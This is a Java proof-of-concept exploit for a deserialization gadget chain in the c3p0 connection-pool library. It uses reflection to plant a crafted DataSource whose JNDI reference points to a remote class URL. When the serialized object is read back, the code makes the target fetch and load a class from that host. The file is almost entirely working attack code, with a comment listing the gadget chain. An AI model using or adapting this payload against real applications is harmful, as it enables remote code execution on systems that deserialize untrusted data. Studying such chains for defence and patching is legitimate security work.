package payload;

import com.mchange.v2.c3p0.WrapperConnectionPoolDataSource;
import com.mchange.v2.c3p0.impl.WrapperConnectionPoolDataSourceBase;

import javax.naming.NamingException;
import javax.naming.Reference;
import javax.naming.Referenceable;
import javax.sql.DataSource;
import javax.sql.PooledConnection;
import java.io.*;
import java.lang.reflect.Field;
import java.sql.Connection;
import java.sql.SQLException;
import java.sql.SQLFeatureNotSupportedException;
import java.util.logging.Logger;


/**
 * gadget chain
 * readObject:526, WrapperConnectionPoolDataSourceBase (com.mchange.v2.c3p0.impl)
 * getObject:118, ReferenceIndirector$ReferenceSerialized (com.mchange.v2.naming)
 * referenceToObject:88, ReferenceableUtils (com.mchange.v2.naming)
 * <init>:100, URLClassLoader (java.net)
 */



public class C3P0_Poc2 {
    private static final class PoolSource implements DataSource, Referenceable {

        private String className;
        private String url;

        public PoolSource ( String className, String url ) {
            this.className = className;
            this.url = url;
        }

        public Reference getReference () throws NamingException {
            return new Reference("exploit", this.className, this.url);
        }

        public PrintWriter getLogWriter () throws SQLException {return null;}
        public void setLogWriter ( PrintWriter out ) throws SQLException {}
        public void setLoginTimeout ( int seconds ) throws SQLException {}
        public int getLoginTimeout () throws SQLException {return 0;}
        public Logger getParentLogger () throws SQLFeatureNotSupportedException {return null;}
        public PooledConnection getPooledConnection () throws SQLException {return null;}
        public PooledConnection getPooledConnection ( String user, String password ) throws SQLException {return null;}

        @Override
        public Connection getConnection() throws SQLException {
            return null;
        }

        @Override
        public Connection getConnection(String username, String password) throws SQLException {
            return null;
        }

        @Override
        public <T> T unwrap(Class<T> iface) throws SQLException {
            return null;
        }

        @Override
        public boolean isWrapperFor(Class<?> iface) throws SQLException {
            return false;
        }
    }

    public static void main(String[] args) throws NoSuchFieldException, IOException, IllegalAccessException, ClassNotFoundException {
        WrapperConnectionPoolDataSourceBase poolBackedDataSourceBase = new WrapperConnectionPoolDataSource(false);
        Class cls = poolBackedDataSourceBase.getClass().getSuperclass();
        Field field = cls.getDeclaredField("nestedDataSource");
        field.setAccessible(true);
        field.set(poolBackedDataSourceBase,new PoolSource("exp","http://127.0.0.1:8990/"));


        //         serialize
        ObjectOutputStream outputStream = new ObjectOutputStream(new FileOutputStream("./ccv4"));
        outputStream.writeObject(poolBackedDataSourceBase);
        outputStream.close();


        //        deserialize
        ObjectInputStream inputStream = new ObjectInputStream(new FileInputStream("./ccv4"));
        inputStream.readObject();
    }
}
